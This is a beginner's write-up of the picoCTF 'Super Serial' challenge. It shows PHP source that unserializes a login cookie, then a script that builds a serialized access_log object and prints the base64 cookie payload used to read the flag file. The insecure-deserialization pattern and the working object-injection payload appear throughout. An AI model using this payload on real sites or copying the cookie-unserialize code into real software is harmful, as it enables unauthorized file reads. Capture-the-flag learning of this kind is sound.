# [picoCTF](https://play.picoctf.org/practice?category=1)

A noob trying to solve noob ctfs

## Super Serial

Try to recover the flag stored on this website http://mercury.picoctf.net:14804/

Looking at  `robots.txt` we see `admin.phps`, we try to find it but is 404, we can try `index.php` and we see other files, most significat `cookies.phps` and `authentification.phps`

We see that `index.phps` includes `cookies.phps` and serializes some kind of object that the login is based on
```php
$perm_res = new permissions($username, $password);
if ($perm_res->is_guest() || $perm_res->is_admin()) {
    setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
    header("Location: authentication.php");
    die();
} else {
    $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
}
```

Then, in `cookies.phps` the cookie is deserialized 
```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
```

Searching this on [Google](https://www.google.com/search?q=serialize+php+vuln), we quickly see it's very bad, we cand basically insert any kind of php object we want in there.

After some messing around, I've realized that `serialize()` makes objects into strings, encoding only the class name and the values, not methods. So that means that our payload must be an already defined object class in the code.

We then see the `access_log` class

```php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
```

It uses a file path as a value in constructor, and the `__toString()` call reads that file

We can write a simple php script like this

```php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

$obj = new access_log('../flag');
$enc = urlencode(base64_encode(serialize($obj)));
echo $enc;//TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
echo "\n";
```

Now, going on `/authentification.php` the code will reach the code in `cookie.php` where the `__toString()` will be called, because the fact that we don't have a `is_admin()` method defined on `access_log` will raise an error that just prints out object on the screen.
